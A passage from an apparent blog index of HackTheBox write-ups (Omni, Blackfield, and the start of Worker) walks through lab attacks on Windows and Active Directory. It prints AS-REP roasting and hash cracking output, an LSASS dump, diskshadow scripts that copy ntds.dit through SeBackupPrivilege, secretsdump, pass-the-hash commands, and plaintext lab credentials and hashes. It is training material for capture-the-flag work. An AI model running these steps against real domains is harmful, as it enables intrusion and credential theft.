C:\\Data\\Users\\app\\user.txt. Since I have access as the SYSTEM itself, I can read both the user flag and the root flag directly, but the flags are encrypted.\nroot.txt:\nPS C:\\\u0026gt; type C:\\Data\\Users\\administrator\\root.txt type root.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; user.txt:\nPS C:\\\u0026gt; type C:\\Data\\Users\\app\\user.txt type C:\\Data\\Users\\app\\user.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredent^M^M \u0026lt;T\u0026gt;System.Management.Automation.PSCredent^M^M \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; This article shows way to decrypt those two files.\n$credential = Import-CliXml -Path \u0026lt;PathToXml\u0026gt;\\MyCredential.xml $credential.GetNetworkCredential().Password But then, I get an \u0026ldquo;Error occurred during a cryptographic operation\u0026rdquo; message. After Googling around to find the answer why it doesn’t work, it turns out the flag can only be decrypted by the user itself. So if I want to decrypt user.txt, I have to get access as app user.\nWhile enumerating files recursively using the dir command, I spotted a batch file placed in the PowerShell folder.\nPS C:\\\u0026gt;cmd /c \u0026#34;dir /s /b *.bat\u0026#34; cmd /c \u0026#34;dir /s /b *.bat\u0026#34; C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Build.bat C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\bin\\Pester.bat The batch files contains the credentials for user app and administrator. The file itself looks like automation script to revert the user and admin account to default.\nPS C:\\\u0026gt; gc \u0026#34;C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat\u0026#34; gc \u0026#34;C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat\u0026#34; @echo off :LOOP for /F \u0026#34;skip=6\u0026#34; %%i in (\u0026#39;net localgroup \u0026#34;administrators\u0026#34;\u0026#39;) do net localgroup \u0026#34;administrators\u0026#34; %%i /delete net user app mesh5143 net user administrator _1nt3rn37ofTh1nGz ping -n 3 127.0.0.1 cls GOTO :LOOP :EXIT Decrypting the Flags Both credentials are works on the Windows Device Portal (WDP) web. WDP has a feature that allows you to do command execution on the system, so I can decrypt each flag from there.\nFor the root flag, I\u0026rsquo;ll use the administrator account (administrator:_1nt3rn37ofTh1nGz) and issue the command below.\npowershell.exe -c \u0026#34;$credential=Import-CliXml -Path U:\\Users\\Administrator\\root.txt ;$credential.GetNetworkCredential().Password;\u0026#34;  For the user flag, the procedure goes the same.\n References  https://nmap.org/nsedoc/scripts/http-auth.html https://github.com/SafeBreach-Labs/SirepRAT  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-omni/","summary":"Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I\u0026rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.\nSkills Learned  Exploiting Windows IoT Decrypting PSCredential object  Tools  Kali Linux (Attacking Machine) - https://www.","tags":["OSCP-like","Windows","Windows-IoT","SirepRAT","PSCredential"],"title":"HackTheBox - Omni"},{"content":"Blackfield is a hard difficulty Windows machine from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I\u0026rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the NTDS.dit file from there. With the NTDS.dit file, I\u0026rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.\nSkills Learned  AS-REP roasting LDAP enumeration BloodHound Abusing Windows Access Tokens - SeBackupPrivilege  Tools  Kali Linux 2019.4 (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux smbclient - Preinstalled in Kali Linux SMBMap - Preinstalled in Kali Linux ldapdomaindump - https://github.com/dirkjanm/ldapdomaindump CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec BloodHound - https://github.com/BloodHoundAD/BloodHound BloodHound.py - https://github.com/fox-it/BloodHound.py SeBackupPrivilege CmdLets - https://github.com/giuliano108/SeBackupPrivilege  Reconnaissance Nmap → root@iamf «blackfield» «10.10.14.169» $ nmap -sC -sV -oN initial-blackfield 10.10.10.192 Nmap scan report for blackfield.htb (10.10.10.192) Host is up (0.054s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020–10–04 10:53:38Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=10/3%Time=5F794746%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m59s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020–10–04T10:55:58 |_ start_date: N/A An initial TCP scan with nmap discovered at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).\nI\u0026rsquo;ll summarize the result:\n There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority. There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here. There is MS-RPC service on port 135, which I don\u0026rsquo;t touch it really often, so I\u0026rsquo;ll lower the priority. There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft\u0026rsquo;s implementation of directory services and it supports LDAP query. There is an SMB service on port 445. I can try anonymous login here. Port 3268 is running LDAP as well, but it\u0026rsquo;s used as global catalog (read more: here).  nmap also identified the AD domain name is blackfield.local.\nEnumeration TCP 389 - LDAP On LDAP, I can send a query to obtain the domain metadata, but first I\u0026rsquo;ll look into the rootDSE1 to retrieve a list of the domain naming context.\n→ root@iamf «blackfield» «10.10.14.169» $ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts dn: namingcontexts: DC=BLACKFIELD,DC=local namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local   -LLL: removes every comments in the output\n  -x: to perform simple authentication\n  -h: hostname or IP\n  -s: search scope, base will returns the contents of the root DSE\n  I can use DC=BLACKFIELD,DC=local (this is called as distinguished name), but unfortunately the anonymous bind is not allowed.\nTCP 445 - SMB Trying anonymous login with crackmapexec returns a status access denied.\n→ root@iamf «blackfield» «10.10.14.169» $ crackmapexec smb 10.10.10.192 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [-] BLACKFIELD.local\\: STATUS_ACCESS_DENIED SMB 10.10.10.192 445 DC01 [-] Error enumerating shares: STATUS_ACCESS_DENIED But on using smbclient, it return the shares list.\n→ root@iamf «blackfield» «10.10.14.169» $ smbclient -N -L //10.10.10.192/ Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share forensic Disk Forensic / Audit share. IPC$ IPC Remote IPC NETLOGON Disk Logon server share profiles$ Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection for 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT) Unable to connect with SMB1 -- no workgroup available Later, I came to know that ‘anonymous’ must be specified in crackmapexec.\n profiles$ share I have read permission on the profile$ share. The share contains a bunch of empty users folder.\n I can convert these folders name to list of username using awk '{print $1}'.\n→ root@iamf «blackfield» «10.10.14.169» $ cat folder.list | awk \u0026#39;{print $1}\u0026#39; | tee users.list AAlleni ABarteski ABekesz ABenzies ABiemiller AChampken ...\u0026lt;SNIP\u0026gt;... Now that I have a list of usernames, I can try AS-REP roast attack.\nTCP 88 - Kerberos AS-REP roasting I\u0026rsquo;ll use GetNPUsers.py to perform AS-REP roasting on Kerberos.\n→ root@iamf «blackfield» «10.10.14.169» $ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP And watching the output file using watch command\n→ root@iamf «blackfield» «10.10.14.169» $ watch -n 1 cat TGT_AS-REP After a few minutes, it shows the hash for user support.\n I\u0026rsquo;ll send the hash to my Windows for cracking.\n→ root@iamf «blackfield» «10.10.14.169» $ cat TGT_AS-REP $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805 Cracking the Hash I\u0026rsquo;ll use dictionary attack to recover the user password using hashcat, and it cracks within a few seconds.\nC:\\tools\\hashcat6\u0026gt; hashcat -m 18200 hashes/blackfield.hash rockyou.txt -O hashcat (v6.1.1) starting... ...\u0026lt;SNIP\u0026gt;... $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e...3ab805 ...\u0026lt;SNIP\u0026gt;... The password for user support is #00^BlackKnight.\nAccess as support Now that I obtained a set of credentials, I can re-enumerate the available services.\nLDAP Domain Dump The credentials works on LDAP, I can use it to obtain the domain info using ldapdomaindump.\n→ root@iamf «loot» «10.10.14.169» $ ldapdomaindump -u \u0026#39;BLACKFIELD.LOCAL\\support\u0026#39; -p \u0026#39;#00^BlackKnight\u0026#39; -no-json -no-grep 10.10.10.192 [*] Connecting to host... [*] Binding to host [+] Bind OK [*] Starting domain dump [+] Domain dump finished The output from the tool are formatted in HTML document, and I get the following information:\nThe OS information and the computer FQDN.\n The domain policy.\n The interesting domain users.\n  Interesting groups\n   From here, I know that user support does not have remote shell access like WinRM.\nBloodHound There is a python-based ingestor for BloodHound besides SharpHound. It can be used remotely from Linux.\n→ root@iamf «loot» «10.10.14.169» $ python bloodhound.py -c All -u \u0026#39;support@blackfield.local\u0026#39; -p \u0026#39;#00^BlackKnight\u0026#39; -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192  -c: collect method : all -u,-p: credentials set -d: domain name -dc: FQDN of domain controller (it’s on ldap domain dump section → domain_computers.html) -ns: name server / DNS  It returns the following output:\nINFO: Found AD domain: blackfield.local INFO: Connecting to LDAP server: DC01.BLACKFIELD.local INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 18 computers INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Found 316 users INFO: Connecting to GC LDAP server: dc01.blackfield.local INFO: Found 51 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.BLACKFIELD.local INFO: Done in 00M 18S The output files from the tool are in json format. They are: computers.json, domains.json, groups.json and users.json.\nI can upload these files to BloodHound GUI by drag and drop.\n Enumerating the user support permissions discovers it has ForceChangePassword permission on Audit2020. That means user support is able to change the user audit2020 password.\n Reset Audit2020 Password I can change the user audit2020 password using net rpc2. I\u0026rsquo;ll set P@$$w0rd! as the new password for user audit2020.\n→ root@iamf «blackfield» «10.10.14.169» $ net rpc password audit2020 -U \u0026#39;support%#00^BlackKnight\u0026#39; -S 10.10.10.192 Enter new password for audit2020: Access as Audit2020 forensic share With audit2020, I can access the forensic share.\n→ root@iamf «blackfield» «10.10.14.169» $ smbmap -H 10.10.10.192 -u audit2020 -p \u0026#39;P@$$w0rd!\u0026#39; [+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic READ ONLY Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share Inside the share, there is three folders, and I\u0026rsquo;ll download all of them to my Kali.\n→ root@iamf «blackfield» «10.10.14.169» $ smbclient -U \u0026#39;audit2020%P@$$w0rd!\u0026#39;//10.10.10.192/forensic Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Feb 23 20:03:16 2020 .. D 0 Sun Feb 23 20:03:16 2020 commands_output D 0 Mon Feb 24 01:14:37 2020 memory_analysis D 0 Fri May 29 03:28:33 2020 tools D 0 Sun Feb 23 20:39:08 2020 smb: \\\u0026gt; recurse on smb: \\\u0026gt; mget * Enumerating on the memory_analysis folder, there is a file called lsass.zip that contains lsass.DMP which is interesting to me.\n→ root@iamf «blackfield» «10.10.14.169» $ file lsass.DMP lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type  LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.\n I can use a tool called pypykatz to dump the contents of lsass.DMP. The NT hash of svc-backup immediately shows up on the top.\n svc_backup:9658d1d1dcd9250115e2205d9f48400d.\nFoothold Shell as svc_backup Remote Access I already know that this user can login remotely (from LDAP), so I can try it with evil-winrm, and it works.\n→ root@iamf «blackfield» «10.10.14.169» $ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'  User flag is done here.\nPrivilege Escalation Shell as Administrator Internal Enumeration Also from LDAP, svc-backup is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called SeBackupPrivilege and SeRestorePrivilege.\n Those two privileges can be abused3 using diskshadow4.\nI can\u0026rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called \u0026ldquo;Shadow Copy\u0026rdquo; that makes this possible, and that\u0026rsquo;s where diskshadow will be used.\nSo the idea is that I can create a volume shadow of C:\\ drive and backup the NTDS.dit file (AD database) from the volume shadow back to C:\\ drive. After that I can grab the ntds.dit and dump the NT hashes from NTDS.dit locally using secretsdump.py.\nAbusing SeBackupPrivilege To abuse this privilege, I\u0026rsquo;ll use this gist as reference, and I\u0026rsquo;ll need this module.\nThen, I\u0026rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab ntds.dit, and cleanup the volume shadow) in one shot.\nFirst, the script for grabbing ntds.dit, I\u0026rsquo;ll save it as copy.cmd\ncmd.exe /c \u0026#34;powershell.exe -c Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Copy-FileSeBackupPrivilege f:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit\u0026#34; Second, the script for creating and deleting the volume shadow, I\u0026rsquo;ll save it as script.txt.\nset context persistent nowriters add volume c: alias iamf create expose %iamf% f: exec \u0026#34;copy.cmd\u0026#34; delete shadows volume %iamf% reset I\u0026rsquo;ll move the modules and the scripts to a folder called exploits.\n→ root@iamf «exploits» «10.10.14.169» $ tree . ├── SeBackupPrivilegeCmdLets.dll ├── SeBackupPrivilegeUtils.dll ├── copy.cmd └── script.txt 0 directories, 4 files Now, I’ll copy these .dll modules, copy.cmd, and script.txt to Blackfield using upload feature from evil-winrm at C:\\temp\\.\n→ root@iamf «exploits» «10.10.14.169» $ evil-winrm -i 10.10.10.192 -u svc_backup -H \u0026#39;9658d1d1dcd9250115e2205d9f48400d\u0026#39; Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt;mkdir C:\\temp; cd C:\\temp ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload SeBackupPrivilegeCmdLets.dll ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload SeBackupPrivilegeUtils.dll ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload copy.cmd ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload script.txt ...\u0026lt;SNIP\u0026gt;... After that, I can run diskshadow with the /s option and specify script.txt as the command sequence.\nEvil-WinRM* PS C:\\temp\u0026gt; diskshadow /s script.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 10/4/2020 8:15:53 AM -\u0026gt; set context persistent nowriters -\u0026gt; add volume c: alias iamf -\u0026gt; create Alias iamf for shadow ID {7c53326a-2617-450c-9d2d-5c381352aa45} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} set as environment variable. Querying all shadow copies with the shadow copy set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} * Shadow copy ID = {7c53326a-2617-450c-9d2d-5c381352aa45} %iamf% - Shadow copy set: {6142125a-a889-46a9-9d5e-87ff17b66d2c} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 10/4/2020 8:15:54 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u0026gt; expose %iamf% f: -\u0026gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45} The shadow copy was successfully exposed as f:\\. -\u0026gt; exec \u0026#34;copy.cmd\u0026#34; C:\\temp\u0026gt;cmd.exe /c \u0026#34;powershell.exe -c Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Copy-FileSeBackupPrivilege f:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit\u0026#34; Copied 18874368 bytes -\u0026gt; delete shadows volume %iamf% -\u0026gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45} Deleting shadow copy {7c53326a-2617-450c-9d2d-5c381352aa45} on volume \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]... Number of shadow copies deleted: 1 -\u0026gt; reset Now that I have the ntds.dit, the last file that I need is the registry hive.\nEvil-WinRM* PS C:\\temp\u0026gt; reg save HKLM\\SYSTEM c:\\temp\\system The operation completed successfully. I\u0026rsquo;ll download these files to my Kali using evil-winrm download feature.\nEvil-WinRM* PS C:\\temp\u0026gt; ls Directory: C:\\temp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/4/2020 8:20 AM 18874368 ntds.dit -a---- 10/4/2020 8:14 AM 222 copy.cmd -a---- 10/4/2020 8:15 AM 140 script.txt -a---- 10/4/2020 8:14 AM 12288 SeBackupPrivilegeCmdLets.dll -a---- 10/4/2020 8:14 AM 16384 SeBackupPrivilegeUtils.dll -a---- 10/4/2020 8:21 AM 17547264 system Credentials Dumping Now I can dump the NT hash from ntds.dit and system file using secretsdump.py.\n→ root@iamf «loot» «10.10.14.169» $ secretsdump.py -system system -ntds ntds.dit LOCAL Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: ...\u0026lt;SNIP\u0026gt;... Remote Access I can use the NT hash of administrator account to login using evil-winrm pass-the-hash feature.\n→ root@iamf «loot» «10.10.14.169» $ evil-winrm -i 10.10.10.192 -u administrator -H \u0026#39;184fb5e5178480be64824d4cd53b99ee\u0026#39;    It\u0026rsquo;s an anonymous authentication, but limited only to the rootDSE. In the domain controller (DC) side, it needs to know who are we and what authentication do we support, so it sends us the same thing it asked which exposes\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://room362.com/post/2017/reset-ad-user-password-with-linux/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://github.com/giuliano108/SeBackupPrivilege\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/","summary":"Blackfield is a hard difficulty Windows machine from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I\u0026rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","SMB","ASREP-roasting","BloodHound","SharpHound","Net-RPC","Token-privileges","SeBackupPrivilege","Diskshadow","evil-winrm","secretsdump.py","Bloodhound.py","ldapdomaindump"],"title":"HackTheBox - Blackfield"},{"content":"Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I\u0026rsquo;m able to gain administrator access by exploiting Azure Pipeline.\nSkills Learned  SVN enumeration Windows enumeration Exploiting Azure Pipelines  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux svn cli client - Preinstalled in Kali Linux Evil-WinRM - https://github.com/Hackplayers/evil-winrm  Reconnaissance Nmap An initial TCP scan with nmap discovers two open ports: 80 (HTTP) and 3690 (Subversion)\n→ root@kali «worker» «10.10.14.19» $ nmap -sC -sV -oN worker-initial -v 10.10.10.203 # Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203 Nmap scan report for dimension.worker.htb (10.10.10.203) Host is up (0.16s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 3690/tcp open svnserve Subversion Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.\n→ root@kali «worker» «10.10.14.19» $ nmap -p53,445,389,5985 10.10.10.203 Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-31 13:34 EST Host is up (0.013s latency). PORT STATE SERVICE 53 filtered domain 389 filtered ldap 445 filtered microsoft-ds 5985 open wsman Enumeration TCP 80 - Website Visiting the port 80 displays the IIS default page.\n TCP 3690 - Subversion/SVN This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I\u0026rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.\nThe general usage as follows:\nsvn \u0026lt;sub-command\u0026gt; svn://[ip]  Example of subcommand: ls, cat, info, log.  With the subcommand ls, I can list the repository contents.\n→ root@kali «worker» «192.168.2.103» $ svn ls svn://10.10.10.203 dimension.worker.htb/ moved.txt moved.txt tells that the repository is no longer maintained. The latest repo is available at http://devops.worker.htb\n→ root@kali «worker» «192.168.2.103» $ svn cat svn://10.10.10.203/moved.txt This repository has been migrated and will no longer be maintaned here. You can find the latest version at: http://devops.worker.htb // The Worker team :) With the subcommand info, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).\n→ root@kali «worker» «192.168.2.103» $ svn info svn://10.10.10.203 Path: . URL: svn://10.10.10.203 Relative URL: ^/ Repository Root: svn://10.10.10.203 Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1 Revision: 5 Node Kind: directory Last Changed Author: nathen Last Changed Rev: 5 Last Changed Date: 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) I can check the revision log using the sub command log.\n→ root@kali «worker» «192.168.2.103» $ svn log svn://10.10.10.203 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r5 | nathen | 2020–06–20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line Added note that repo has been migrated - - - - - - - - - - - - - 